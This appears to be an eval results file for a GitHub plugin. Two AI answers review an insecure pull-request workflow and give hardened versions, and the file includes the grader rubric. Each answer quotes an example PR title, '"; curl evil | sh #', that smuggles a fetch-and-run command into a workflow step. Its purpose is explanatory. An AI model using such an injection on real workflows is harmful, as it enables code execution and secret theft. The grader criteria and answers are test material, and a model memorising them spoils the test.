@@ -1,0 +1,139 @@
+{
+  "schemaVersion": 1,
+  "claudeVersion": "2.1.286",
+  "startedAt": "2026-10-02T21:30:35.863Z",
+  "durationSeconds": 21,
+  "costUsd": 0.14910679999999998,
+  "partial": false,
+  "suite": {
+    "root": "/home/buck/Projects/adminhead/claude-plugins/plugins/github",
+    "ablation": "with-without",
+    "caseFilter": "task-*",
+    "threshold": 1,
+    "concurrency": 3,
+    "plugins": [
+      {
+        "name": "github",
+        "version": "0.2.0",
+        "path": "/home/buck/Projects/adminhead/claude-plugins/plugins/github"
+      }
+    ]
+  },
+  "cases": [
+    {
+      "name": "task-workflow-prt",
+      "dir": "evals/task-workflow-prt",
+      "source": "mixed",
+      "promptMarkdown": "Our public repo at `/home/buck/Projects/adminhead/claude-plugins/plugins/github/evals/task-workflow-prt/fixture` runs this PR check on every pull request, including ones from forks. It works, but please review the workflow and give me a corrected version.",
+      "model": "claude-sonnet-5-5",
+      "runsPerCase": 1,
+      "timeoutSeconds": 300,
+      "maxTurns": 10,
+      "graders": [
+        {
+          "name": "fires-skill",
+          "type": "tool_used",
+          "weight": 1,
+          "config": {
+            "tool": "Skill",
+            "input_match": "\"skill\"\\s*:\\s*\"github:actions\""
+          }
+        },
+        {
+          "name": "trust-boundary",
+          "type": "llm",
+          "weight": 1,
+          "graderMarkdown": "Rules: under `pull_request_target` never check out or run PR-controlled code; use `pull_request` for untrusted PR CI; never interpolate untrusted PR fields into `run:`; minimal `permissions`; never run untrusted PR code on self-hosted runners; follow the repo's action pinning convention.\n\nPASS only if the answer and corrected workflow do ALL of these:\n1. Identifies that `pull_request_target` plus checkout of the PR head SHA plus `npm ci` / `scripts/check.sh` runs fork code with write permissions and `DEPLOY_TOKEN`, and the corrected workflow stops running PR code in a privileged context (test job on `pull_request` with no secrets; any commenting done in a separate job or `workflow_run` that does not execute PR code).\n2. Replaces `permissions: write-all` with minimal scoped permissions and stops passing `DEPLOY_TOKEN` to PR code.\n3. Flags the `${{ github.event.pull_request.title }}` interpolation in `run:` as script injection and passes it through `env:`.\n4. Moves the PR job off the `self-hosted` runner to a GitHub-hosted runner (or states untrusted PR code must never run on it).\n5. Any action it adds or changes is pinned to a full commit SHA like `release.yml` does (the repo convention), not a floating tag such as `@v7`, or it explicitly says the SHA must be looked up and keeps the pin style.\nFAIL if any of the five is missing. Do not reward length.",
+          "config": {
+            "criteria": "Rules: under `pull_request_target` never check out or run PR-controlled code; use `pull_request` for untrusted PR CI; never interpolate untrusted PR fields into `run:`; minimal `permissions`; never run untrusted PR code on self-hosted runners; follow the repo's action pinning convention.\n\nPASS only if the answer and corrected workflow do ALL of these:\n1. Identifies that `pull_request_target` plus checkout of the PR head SHA plus `npm ci` / `scripts/check.sh` runs fork code with write permissions and `DEPLOY_TOKEN`, and the corrected workflow stops running PR code in a privileged context (test job on `pull_request` with no secrets; any commenting done in a separate job or `workflow_run` that does not execute PR code).\n2. Replaces `permissions: write-all` with minimal scoped permissions and stops passing `DEPLOY_TOKEN` to PR code.\n3. Flags the `${{ github.event.pull_request.title }}` interpolation in `run:` as script injection and passes it through `env:`.\n4. Moves the PR job off the `self-hosted` runner to a GitHub-hosted runner (or states untrusted PR code must never run on it).\n5. Any action it adds or changes is pinned to a full commit SHA like `release.yml` does (the repo convention), not a floating tag such as `@v7`, or it explicitly says the SHA must be looked up and keeps the pin style.\nFAIL if any of the five is missing. Do not reward length.",
+            "focus": "last_message"
+          }
+        }
+      ],
+      "arms": {
+        "with": [
+          {
+            "score": 1,
+            "passed": true,
+            "turns": 10,
+            "costUsd": 0.0954342,
+            "judgeCostUsd": 0.004587000000000001,
+            "durationSeconds": 21,
+            "startedAt": "2026-10-02T21:30:35.874Z",
+            "error": null,
+            "tracePath": "/tmp/claude-eval-YweU7Z/out/trace.jsonl",
+            "skippedPaidGraders": false,
+            "graders": [
+              {
+                "name": "fires-skill",
+                "passed": true,
+                "weight": 1,
+                "explanation": "Skill called 1x (expected 1..∞)",
+                "withOnly": true,
+                "scored": false
+              },
+              {
+                "name": "trust-boundary",
+                "passed": true,
+                "weight": 1,
+                "explanation": "judge votes: PASS PASS PASS",
+                "withOnly": false,
+                "scored": true,
+                "judgeVotes": [
+                  true,
+                  true,
+                  true
+                ],
+                "evidence": "I haven't edited the file. Here is the review and a corrected version.\n\n## Problems in `pr-check.yml`\n\n1. **`pull_request_target` with a checkout of the PR head SHA.** This is the main problem. The job runs fork-controlled code (`npm ci` runs install scripts, and `check.sh` and `package.json` come from the PR) in a context that has secrets and a write token. Anyone can open a PR and run arbitrary code with your privileges.\n2. **`permissions: write-all`.** A compromised job could push code, edit releases and so on.\n3. **`runs-on: self-hosted` on a public repo.** Fork code can persistently compromise the runner and your network. Public PR code should only run on GitHub-hosted runners.\n4. **`DEPLOY_TOKEN` is exposed to the test step.** A PR check has no need for a deploy secret, and the fork's code could read it.\n5. **Script injection.** `${{ github.event.pull_request.title }}` is interpolated directly into `run:`. A PR title like `\"; curl evil | sh #` becomes code.\n6. **The \"Checks passed.\" comment.** It needs write access, which fork PRs shouldn't have. It is also redundant, because the check's own status already reports pass or fail. It also posts even if you later reorder steps. `github-script@v7` is a moving tag, unlike your other SHA-pinned actions.\n7. **Smaller issues.** The checkout keeps credentials persisted, and nothing limits job runtime. Nothing cancels superseded runs either.\n\n## Corrected version\n\n```yaml\nname: PR check\n\non:\n  pull_request:\n    types: [opened, synchronize, reopened]\n\npermissions:\n  contents: read\n\nconcurrency:\n  group: pr-check-${{ github.event.pull_request.number }}\n  cancel-in-progress: true\n\njobs:\n  check:\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n    steps:\n      - uses: actions/checkout@3df4ab11eba7bda6032a0b82a6bb43b11571feac # v4.0.0\n        with:\n          persist-credentials: false\n\n      - name: Announce\n        run: echo \"Checking PR - $PR_TITLE\"\n        env:\n          PR_TITLE: ${{ github.event.pull_request.title }}\n\n      - name: Install and test\n        run: |\n          npm ci\n          ./scripts/check.sh\n```\n\n## What changed\n\n- **Trigger:** it is now `pull_request`. Fork PRs run with a read-only token and no secrets, and the code is tested in an isolated context.\n- **Permissions:** `contents: read` is the only grant.\n- **Runner:** `ubuntu-latest`, which is clean and ephemeral.\n- **Secrets:** `DEPLOY_TOKEN` is removed.\n- **PR title:** it goes through `env:` and is quoted by the shell, so it is data and not code.\n- **Comment step:** removed. The required check status already says \"passed\". If you want a comment, post it from a separate `workflow_run` workflow that never checks out or runs PR code, and ask me for a design before building that.\n- **Checkout:** `persist-credentials: false`.\n- **Added:** `timeout-minutes` and a `concurrency` group with `cancel-in-progress` so superseded pushes don't pile up.\n\n## Things to check on your side\n\n- **Action version:** I kept the existing `actions/checkout` pin (v4.0.0), which is old. I couldn't look up the latest release SHA from here, so I didn't invent one. Bump it to the latest stable release with a verified SHA (`gh api repos/actions/checkout/git/ref/tags/<tag>`). `release.yml` has the same pin, and `softprops/action-gh-release` is at v0.1.15.\n- **Repo settings:** if the `DEPLOY_TOKEN` secret was ever available to this workflow, treat it as exposed and rotate it. Also review the \"Fork pull request workflows\" settings, and remove or restrict the self-hosted runner for public repos. I didn't change any of those.\n- **Required checks:** the job name `check` is unchanged, so branch protection should keep matching it.\n- **Not verified:** I haven't run `actionlint` or the workflow itself. Static review can't confirm hosted execution.\n\nI can apply this to the file if you'd like."
+              }
+            ]
+          }
+        ],
+        "without": [
+          {
+            "score": 1,
+            "passed": true,
+            "turns": 5,
+            "costUsd": 0.053672599999999994,
+            "judgeCostUsd": 0.0043230000000000005,
+            "durationSeconds": 17,
+            "startedAt": "2026-10-02T21:30:35.874Z",
+            "error": null,
+            "tracePath": "/tmp/claude-eval-o0li4o/out/trace.jsonl",
+            "skippedPaidGraders": false,
+            "graders": [
+              {
+                "name": "trust-boundary",
+                "passed": true,
+                "weight": 1,
+                "explanation": "judge votes: PASS PASS PASS",
+                "withOnly": false,
+                "scored": true,
+                "judgeVotes": [
+                  true,
+                  true,
+                  true
+                ],
+                "evidence": "The workflow has several serious problems. They combine into a way for any fork PR to take over your repo and runner.\n\n## Problems\n\n1. **`pull_request_target` combined with checking out the PR head SHA.** This is the main problem. `pull_request_target` runs with the base repo's secrets and a write token. The workflow then checks out and runs the fork's code (`npm ci` runs install scripts, and `check.sh` and `package.json` are attacker-controlled). Anyone who opens a PR can run arbitrary code with your secrets.\n2. **`permissions: write-all`.** A compromised job gets full write access to the repo.\n3. **`DEPLOY_TOKEN` exposed to untrusted code.** A PR check doesn't need a deploy secret, and the fork's code can read it from the environment.\n4. **`runs-on: self-hosted` on a public repo.** Fork PRs can run code on your own machine, which can persist between jobs and reach your network. Use GitHub-hosted runners for untrusted code.\n5. **Script injection in `Announce`.** `${{ github.event.pull_request.title }}` is interpolated straight into the shell script. A title like `\"; curl evil | sh #` runs as a command.\n6. **Smaller issues:**\n   - `actions/github-script@v7` is pinned to a mutable tag, while checkout is pinned to a SHA.\n   - Checkout persists credentials by default.\n   - There's no `concurrency` group and no timeout.\n   - The trigger types omit `reopened`.\n\n## Corrected version\n\n```yaml\nname: PR check\n\non:\n  pull_request:\n    types: [opened, synchronize, reopened]\n\npermissions:\n  contents: read\n\nconcurrency:\n  group: pr-check-${{ github.event.pull_request.number }}\n  cancel-in-progress: true\n\njobs:\n  check:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@3df4ab11eba7bda6032a0b82a6bb43b11571feac # v4.0.0\n        with:\n          persist-credentials: false\n\n      - name: Announce\n        env:\n          PR_TITLE: ${{ github.event.pull_request.title }}\n        run: echo \"Checking PR: $PR_TITLE\"\n\n      - name: Install and test\n        run: |\n          npm ci\n          ./scripts/check.sh\n```\n\n## What changed and what to know\n\n- **Trigger:** `pull_request` runs the PR's code with a read-only token and no secrets for forks. This is the safe trigger for running untrusted code.\n- **Secrets:** I removed `DEPLOY_TOKEN`. If a step really needs a secret, run it only from a trusted trigger such as `push` to `main` or `release.yml`, never on PR code.\n- **Permissions:** the workflow now has least-privilege `contents: read`.\n- **Title:** it's passed through an env var, so the shell never parses it as code.\n- **\"Checks passed\" comment:** I removed it. On fork PRs the `pull_request` token can't write comments, so it would fail. The green check on the PR already reports this. If you want the comment, use the two-workflow pattern:\n  1. This workflow uploads a tiny artifact, such as a result flag.\n  2. A separate `workflow_run` workflow, which never checks out or runs PR code, posts the comment. It should treat the artifact as untrusted data.\n- **Pinning:** if you keep `github-script` or add other actions, pin them to full commit SHAs like checkout. I didn't look up a SHA for you.\n\nI only reviewed `pr-check.yml`, `check.sh` and `package.json`. I didn't open `release.yml`. It's worth checking that it doesn't use the same patterns, and that `DEPLOY_TOKEN` is scoped to a protected environment. I also haven't written the corrected version to disk. Tell me if you want me to apply it to `pr-check.yml`."
+              }
+            ]
+          }
+        ]
+      },
+      "aggregates": {
+        "score": 1,
+        "passRate": 1,
+        "scoreWithout": 1,
+        "passRateWithout": 1,
+        "delta": 0
+      }
+    }
+  ],
+  "aggregates": {
+    "casesTotal": 1,
+    "casesPassed": 1,
+    "overallScore": 1,
+    "overallPassRate": 1,
+    "meanDelta": 0
+  }
+}
